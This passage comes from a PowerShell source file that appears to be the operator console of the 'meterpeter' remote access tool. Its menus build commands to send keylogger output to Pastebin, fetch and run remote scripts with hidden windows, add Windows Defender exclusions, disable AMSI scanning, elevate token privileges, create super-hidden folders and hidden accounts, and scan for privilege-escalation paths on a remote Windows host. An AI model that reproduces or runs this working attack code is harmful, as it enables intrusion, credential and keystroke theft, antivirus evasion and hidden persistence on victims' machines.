                 write-host "   => error: missing -PastebinPassword parameter" -ForegroundColor Red -BackgroundColor Black
              }

              Write-Host " - Max of pastes to create : " -NoNewline
              $MaxPastes = Read-Host
              If(-not($MaxPastes) -or $MaxPastes -eq $null)
              {
                 $MaxPastes = "15"
                 write-host "   => Max value missing, defaulting to: $MaxPastes" -ForegroundColor DarkYellow
              }

              Write-Host " - Create past each xxx sec: " -NoNewline
              $TimeOut = Read-Host
              If($MaxPastes -gt 1)
              {
                 If($TimeOut -eq $null -or $TimeOut -lt 120)
                 {
                    $TimeOut = "120"
                    write-host "   => TimeOut value very low, defaulting to: $TimeOut" -ForegroundColor DarkYellow
                 }              
              }
              Else
              {
                 If($TimeOut -eq $null)
                 {
                    $TimeOut = "120"
                    write-host "   => TimeOut value missing, defaulting to: $TimeOut" -ForegroundColor DarkYellow                 
                 }              
              }

              write-host " * Send keystrokes to pastebin" -ForegroundColor Green
              Write-Host "`n" #Module Banner
              Write-Host "   Pastebin Username    : $PastebinUsername"
              If($PastebinPassword -eq $null)
              {
                 Write-Host "   PasteBin password    : " -NoNewline;
                 Write-Host "missing parameter declaration." -ForegroundColor Red -BackgroundColor Black;
              }
              Else
              {
                 Write-Host "   PasteBin password    : " -NoNewline;
                 Write-Host "*********" -ForegroundColor Green;           
              }
              Write-Host "   Max Pastes To Create : $MaxPastes (max)"
              Write-Host "   Create Paste TimeOut : each $TimeOut (seconds)"
              Write-Host "   Keylogger File Path  : `$Env:TMP\void.log`n"

              If($PasteSettings -iMatch '^(True)$')
              {
                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1`" -OutFile `"`$Env:TMP\SendToPasteBin.ps1`"|Unblock-file;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PastebinUsername -PastebinPassword $PastebinPassword -MaxPastes $MaxPastes -TimeOut $TimeOut -Egg true`"";
              }
              Else
              {
                 $Command = $Null;
              }
           }
           Else
           {
              $PasteBinChoise = $null;
              $Command = $Null;
           }
        }
       If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
       {
           $Command = $Null; 
       }
    }

    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ## Post-Exploiation Modules (red-team)
      write-host "`n`n   Description:" -ForegroundColor Yellow;
      write-host "   Post exploitation manager"
      write-host "`n`n   Modules     Description" -ForegroundColor green;
      write-host "   -------     -----------";
      write-host "   Stream      Stream remote host desktop live";
      write-host "   Camera      Take snapshots with remote webcam";
      write-host "   FindEop     Search for EOP possible entry points";
      write-host "   Escalate    Escalate privs from UserLand to Admin";
      write-host "   Persist     Persist the rev tcp shell on startup";
      write-host "   TimeStamp   Change remote host files timestamp";
      write-host "   Artifacts   Clean remote host activity tracks";
      write-host "   HiddenDir   Super\hidden directorys manager";
      write-host "   hideUser    Remote hidden accounts manager";
      write-host "   Passwords   Search for credentials inside files";
      write-host "   BruteAcc    Brute-force user account password";
      write-host "   PhishCred   Promp remote user for logon creds";
      write-host "   AMSIpatch   Disable AMS1 within current process";
      write-host "   Allprivs    Enable all shell privs to exec cmdline";
      write-host "   DumpSAM     DumpLSASS/SAM/SYSTEM/SECURITY metadata";
      write-host "   Exclusions  Manage Windows Defender exclusions";
      write-host "   LockPC      Lock remote host WorkStation";
      write-host "   Restart     Restart remote host WorkStation";
      write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
      write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      If($choise -ieq "HiddenDir" -or $choise -ieq "Hidden")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   This cmdlet allow users to Query\Create\Delete super hidden folders."
         write-host "   Super hidden folders contains 'hidden, system' attributes set and does"
         write-host "   not show-up in explorer (gui) even if 'show hidden files' its activated."
         Write-Host "   Remark: Leave the input fields blank to random search for directorys." -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  ------------------";
         write-host "   Search   for regular hidden folders   UserLand";
         write-host "   Super    Search super hidden folders  UserLand";
         write-host "   Create   Create\Modify super hidden   UserLand";
         write-host "   Delete   One super hidden folder      UserLand";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Hidden> " -NoNewline -ForeGroundColor Green;
         $Vault_choise = Read-Host;
         If($Vault_choise -ieq "Search")
         {
            $FolderName = Read-Host " - Folder name to search ";
            If(-not($FolderName) -or $FolderName -ieq $null)
            {
               $FolderName = "false"
               Write-Host "   => Error: wrong FolderName, set demo to 'false' .." -ForegroundColor Red
            }

            $Directory = Read-Host " - The directory to scan ";
            If(-not($Directory) -or $Directory -ieq $null)
            {
               $Directory = "false"
               $Recursive = "false"
               Write-Host "   => Error: wrong Directory, set demo to 'CommonLocations' .." -ForegroundColor Red
            }
            Else
            {
               $Recursive = Read-Host " - Recursive search (y|n)";
               If($Recursive -iMatch '^(y|yes)$')
               {
                  $Recursive = "True"
               }
               Else
               {
                  $Recursive = "false"
               }
            }

            Write-Host " * Enumerating hidden folders!" -ForegroundColor Green;write-host ""
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action Query -Directory `"$Directory`" -FolderName `"$FolderName`" -Recursive `"$Recursive`" -Attributes `"Hidden`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Super")
         {
            $FolderName = Read-Host " - Folder name to search ";
            If(-not($FolderName) -or $FolderName -ieq $null)
            {
               $FolderName = "false"
               Write-Host "   => Error: wrong FolderName, set demo to 'false' .." -ForegroundColor Red
            }

            $Directory = Read-Host " - The directory to scan ";
            If(-not($Directory) -or $Directory -ieq $null)
            {
               $Directory = "false"
               $Recursive = "false"
               Write-Host "   => Error: wrong DirectoryInput, set demo to 'CommonLocations' .." -ForegroundColor Red
            }
            Else
            {
               $Recursive = Read-Host " - Recursive search (y|n)";
               If($Recursive -iMatch '^(y|yes)$')
               {
                  $Recursive = "True"
               }
               Else
               {
                  $Recursive = "false"
               }
            }

            Write-Host " * Enumerating super hidden folders.`n" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action Query -Directory `"$Directory`" -FolderName `"$FolderName`" -Recursive `"$Recursive`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Create")
         {
            $Action = Read-Host " - Create Hidden or Visible dir"
            If(-not($Action) -or $Action -ieq $null)
            {
               $Action = "hidden"
               write-host "    => wrong input, default to '$Action'" -ForegroundColor Red
            }

            $FolderName = Read-Host " - Folder name to Create\Modify"
            If(-not($FolderName) -or $FolderName -ieq $null)
            {
               $FolderName = "vault"
               write-host "    => wrong input, default to '$FolderName'" -ForegroundColor Red
            }

            $Directory = Read-Host " - The storage directory to use";
            If(-not($Directory) -or $Directory -ieq $null)
            {
               $Directory = "`$Env:TMP"
               write-host "    => wrong input, default to '$Directory'" -ForegroundColor Red
            }

            Write-Host " * Create\Modify super hidden folders" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action $Action -Directory `"$Directory`" -FolderName `"$FolderName`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Delete")
         {
            $FolderName = Read-Host " - Folder name to delete"
            If(-not($FolderName) -or $FolderName -ieq $null)
            {
               $FolderName = "vault"
               write-host "    => wrong input, default to '$FolderName'" -ForegroundColor Red
            }

            $Directory = Read-Host " - The storage directory"
            If(-not($Directory) -or $Directory -ieq $null)
            {
               $Directory = "`$Env:TMP"
               write-host "    => wrong input, default to '$Directory'" -ForegroundColor Red
            }

            Write-Host " * Delete super hidden folders" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action Delete -Directory `"$Directory`" -FolderName `"$FolderName`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Return" -or $Vault_choise -ieq "cls" -or $Vault_choise -ieq "modules" -or $Vault_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $Vault_choise = $Null;
         }      
      }
      If($choise -ieq "Exclusions")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   Manage Windows Defender exclusions (query, create, delete)."
        write-host "   Types: ExclusionExtension, ExclusionProcess, ExclusionPath,ExclusionIpAddress."
        write-host "   The files covered by the exclusion definition will be excluded from Defender"
        write-host "   Real-time protection, proactive monitoring, Scheduled scans, On-demand scans."
        write-host "   Remark: URI will be upload to %TMP% and not deleted after execution." -ForegroundColor Yellow
        write-host "`n`n   Modules     Description                      Privileges Required" -ForegroundColor green;
        write-host "   -------     -----------                      -------------------";
        write-host "   Query       Query all Defender exclusions    Administrator";
        write-host "   Create      Create a new Defender exclusion  Administrator";
        write-host "   UrlExec     Download\Exec through exclusion  Administrator";
        write-host "   Delete      Delete one Defender exclusion    Administrator";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Exclusions> " -NoNewline -ForeGroundColor Green;
        $WD_choise = Read-Host;
        If($WD_choise -ieq "Query")
        {
           #Execute command remote
           write-host " * Query for Defender exclusions.`n`n" -ForegroundColor Green
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'query';Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
        }
        If($WD_choise -ieq "Create")
        {
           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -NoNewline;
           $ExcludeType = Read-Host;
           If(-not($ExcludeType) -or $ExcludeType -eq $null)
           {
              $ExcludeType = "ExclusionPath"
           }
           write-host " - Exclude from Defender scans: " -NoNewline;
           $ExcludePath = Read-Host;
           If(-not($ExcludePath) -or $ExcludePath -eq $null)
           {
              $ExcludePath = "`$Env:TMP"
           }

           #Execute command remote
           write-host " * Create a new Defender exclusion.`n`n" -ForegroundColor Green
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'add' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
        }
        If($WD_choise -ieq "UrlExec")
        {
           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -NoNewline;
           $ExcludeType = Read-Host;
           If(-not($ExcludeType) -or $ExcludeType -eq $null)
           {
              $ExcludeType = "ExclusionPath"
           }
           write-host " - The URL to be downloaded: " -NoNewline;
           $UriLink = Read-Host;
           If(-not($UriLink) -or $UriLink -eq $null)
           {
              Write-Host "x Error: none URL sellected ..`n" -ForegroundColor Red
              $Command = $Null
           }
           Else
           {
              write-host " - Arguments: " -NoNewline;
              $Arguments = Read-Host;
              write-host " * Create a new Defender exclusion.`n`n" -ForegroundColor Green
              If(-not($Arguments) -or $Arguments -eq $null)
              {
                 #Execute command remote
                 $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'exec' -Type `"$ExcludeType`" -Exclude `"`$Env:TMP`" -Uri `"$UriLink`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"   
              }
              Else
              {
                 #Execute command remote
                 $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'exec' -Type `"$ExcludeType`" -Exclude `"`$Env:TMP`" -Uri `"$UriLink`" -Arguments `"$Arguments`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
              }
           }
        }
        If($WD_choise -ieq "Delete")
        {
           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -NoNewline;
           $ExcludeType = Read-Host;
           If(-not($ExcludeType) -or $ExcludeType -eq $null)
           {
              $ExcludeType = "ExclusionPath"
           }
           write-host " - Exclusion entry to delete: " -NoNewline;
           $ExcludePath = Read-Host;
           If(-not($ExcludePath) -or $ExcludePath -eq $null)
           {
              $ExcludePath = "`$Env:TMP"
           }

           #Execute command remote
           write-host " * Delete one Defender exclusion.`n`n" -ForegroundColor Green
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'del' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
        }
        If($WD_choise -ieq "Return" -or $WD_choise -ieq "cls" -or $WD_choise -ieq "Modules" -or $WD_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $WD_choise = $Null;
          $ExcludeType = $Null;
          $ExcludePath = $Null;
        }
      }
      If($choise -ieq "Allprivs")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   This function uses 'EnableAllParentPrivileges'"
        write-host "   (by: @gtworek) to elevate shell token privileges."
        write-host "`n`n   Modules     Description                             Privileges Required" -ForegroundColor green
        write-host "   -------     -----------                             -------------------";
        write-host "   demo        Enable all token privileges (client)    Administrator";
        write-host "   cmdline     Execute 1 cmdline with full privileges  Administrator";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Allprivs> " -NoNewline -ForeGroundColor Green;
        $all_choise = Read-Host;
        If($all_choise -ieq "demo")
        {
           #Execute command remote
           $CmdlineToExecute = "whoami /priv|Out-File myprivileges.log -Force"
           write-host " * Elevating all process privileges (demo)." -ForegroundColor Green
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force;Get-Content myprivileges.log;Remove-Item myprivileges.log -Force}Else{echo `"   Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
        }
        If($all_choise -ieq "cmdline")
        {
           write-host " - cmdline to execute: " -NoNewline;
           $CmdlineToExecute = Read-Host;
           If(-not($CmdlineToExecute) -or $CmdlineToExecute -eq $null)
           {
              #Demonstration cmdline that executes whoami /priv and stores results on logfile to display on console terminal
              $CmdlineToExecute = "whoami /priv|Out-File myprivileges.log -Force;Start-Sleep -Seconds 1;Get-Content myprivileges.log;Remove-Item myprivileges.log -Force"
           }

           #Execute command remote
           write-host " * Elevating all process privileges." -ForegroundColor Green
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force}Else{echo `"   Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
        }
        If($all_choise -ieq "Return" -or $all_choise -ieq "cls" -or $all_choise -ieq "Modules" -or $all_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $all_choise = $Null;
        }
      }
      If($choise -ieq "AMSIpatch")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   This cmdlet attempts to disable AMS1 string scanning within"
        write-host "   the current process context (terminal console) It also allow is"
        write-host "   users to execute any inputed script trough AMS1 bypass technic.";
        write-host "`n`n   Modules     Description                            Privileges Required" -ForegroundColor green;
        write-host "   -------     -----------                            -------------------";
        write-host "   Console     Disable AMS1 within current process    UserLand";
        write-host "   FilePath    Execute input script trough bypass     UserLand";
        write-host "   PayloadUrl  Download\Execute script trough bypass  UserLand";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:AMSIPatch> " -NoNewline -ForeGroundColor Green;
        $Patch_choise = Read-Host;
        If($Patch_choise -ieq "Console")
        {
           write-host "`n  Technic  Description" -ForegroundColor DarkYellow
           write-host "  -------  -----------"
           write-host "  2        FORC`E_AM`SI_ERROR"
           write-host "  3        AM`SI_UT`ILS_P`AT`CH`n"

           write-host " - Bypass technic to use (2|3): " -NoNewline;
           $Technic = Read-Host;
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -Egg true"
        }
        If($Patch_choise -ieq "FilePath")
        {
           write-host " - Bypass technic to use (2|3)  : " -NoNewline;
           $Technic = Read-Host;
           write-host " - Execute script trough bypass : " -NoNewline;
           $FilePath = Read-Host;
           write-host " - Exec script with args? (y|n) : " -NoNewline;
           $MArs = Read-Host;

           If($MArs -iMatch '^(y|yes)$')
           {
              write-host " - Input script arguments       : " -NoNewline;
              $FileArgs = Read-Host;
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -filepath `"$FilePath`" -fileargs `"$FileArgs`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
           }
           Else
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -filepath `"$FilePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force"           
           }
        }
        If($Patch_choise -ieq "PayloadUrl")
        {
           write-host " - Bypass technic to use (2|3)  : " -NoNewline;
           $Technic = Read-Host;
           write-host " - The Payload Url link         : " -NoNewline;
           $PayloadUrl = Read-Host;
           write-host " - Exec script with args? (y|n) : " -NoNewline;
           $MArs = Read-Host;

           If($MArs -iMatch '^(y|yes)$')
           {
              write-host " - Input script arguments       : " -NoNewline;
              $FileArgs = Read-Host;
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -Payloadurl `"$PayloadUrl`" -fileargs `"$FileArgs`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
           }
           Else
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -payloadurl `"$PayloadUrl`";Remove-Item -Path `"`$Env:TMP\Invoke-Bypass.ps1`" -Force";
           }
        }
        If($Patch_choise -ieq "Return" -or $Patch_choise -ieq "cls" -or $Patch_choise -ieq "Modules" -or $Patch_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Patch_choise = $Null;
        }
      }
      If($choise -ieq "FindEop" -or $choise -ieq "EOP")
      {
        write-host "`n`n   Remark:" -ForegroundColor Yellow;
        write-host "   None of the modules in this sub-category will try to exploit any";
        write-host "   weak permissions found. They will only report the vulnerability.";
        write-host "   Agressive scans takes 3 to 8 minuts depending of scan sellected." -ForeGroundColor DarkYellow
        write-host "`n`n   Modules   Description                       Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                       -------------------";
        write-host "   Check     Retrieve directory permissions    UserLand";
        write-host "   Service   Search for unquoted service paths UserLand";
        write-host "   RottenP   Search For rotten potato vuln     UserLand";
        write-host "   Agressive Search all EOP possible entrys    UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Eop> " -NoNewline -ForeGroundColor Green;
        $my_choise = Read-Host;
        If($my_choise -ieq "Agressive")
        {
           write-host " - Use agressive reports? (y|n): " -NoNewline;
           $VerOut = Read-Host;
           Write-Host " * Search for ALL EOP possible entrys." -ForegroundColor Green;Start-Sleep -Seconds 1;
           If($VerOut -iMatch '^(y|yes)$')
           {
              Write-Host "   => Remark: Module takes aprox 8 minuts to finish .." -ForegroundColor Yellow;write-host "`n";
              $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FindEop.ps1 -OutFile FindEOP.ps1;powershell -file FindEOP.ps1 -verb true;Remove-Item -Path FindEOP.ps1 -Force"
           }
           Else
           {
              Write-Host "   => Remark: Module takes aprox 3 minuts to finish .." -ForegroundColor Yellow;write-host "`n";
              $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FindEop.ps1 -OutFile `$Env:TMP\FindEOP.ps1;powershell -File `$Env:TMP\FindEOP.ps1;Remove-Item -Path `"`$Env:TMP\FindEOP.ps1`" -Force"
           }
        }
        If($my_choise -ieq "Check" -or $my_choise -ieq "check")
        {
          write-host " - Input Remote Folder Path (`$Env:TMP): " -NoNewline
          $RfPath = Read-Host

          write-host " * Enumerate folder permissions (icacls)." -ForegroundColor Green
          If(-not($RfPath))
          {
             $RfPath = "$Env:TMP"
             write-host "   => Error: wrong input, default to: $RfPath" -ForegroundColor Red
             Start-Sleep -Milliseconds 700
          }

          write-host ""
          $Command = "icacls `"$RfPath`" `> dellog.txt;Get-Content dellog.txt;remove-item dellog.txt -Force";
        }
        If($my_choise -ieq "Service" -or $my_choise -ieq "service")
        {
          write-host " * Enumerate unquoted service paths.`n" -ForegroundColor Green;
          $Command = "gwmi -class Win32_Service -Property Name,PathName,StartMode|Where-Object{`$_.StartMode -eq `"Auto`" -and `$_.PathName -notlike `"C:\Windows*`" -and `$_.PathName -NotMatch '`"'}|Select-Object Name,PathName `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force";
        }
        If($my_choise -ieq "RottenP" -or $my_choise -ieq "rotten")
        {
          write-host " * Searching rotten potato vuln settings.`n" -ForegroundColor Green
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   Error: this module cant not run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"   Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   Error: none weak permissions found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
       }
        If($my_choise -ieq "Return" -or $my_choise -ieq "return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "modules" -or $my_choise -ieq "clear")
        {
          $RfPath = $Null;
          $Command = $Null;
          $my_choise = $Null;
          $Group_Attr = $Null;
        }
      }
      If($choise -ieq "HideUser")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   This module query, create or delete windows hidden accounts."
         write-host "   It also allow to set the account 'Visible' or 'Hidden' state."
         write-host "   Warning: Create account requires 'LanmanWorkstation' service running" -ForegroundColor Yellow
         write-host "   or else the account created will not inherit admin privileges token." -ForegroundColor Yellow
         write-host "   Manual check: :meterpeter> Get-Service LanmanWorkstation" -ForegroundColor Blue
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  ------------------";
         write-host "   Query    Query all accounts           UserLand";
         write-host "   Create   Create hidden account        Administrator";
         write-host "   Delete   Delete hidden account        Administrator ";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:HideUser> " -NoNewline -ForeGroundColor Green;
         $AccManager_choise = Read-Host;
         If($AccManager_choise -ieq "Query")
         {
            Write-Host " * Enumerating user accounts." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Query;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force"
         }
         If($AccManager_choise -ieq "Create")
         {
            $AccountName = Read-Host " - Input account name"
            $password = Read-Host " - Input account pass"
            $AccountState = Read-Host " - Account State (hidden|visible)"
            Write-Host " * Create new user account" -ForegroundColor Green
            If(-not($AccountState) -or $AccountState -ieq $null){$AccountState = "hidden"}Else{$AccountState = "visible"}
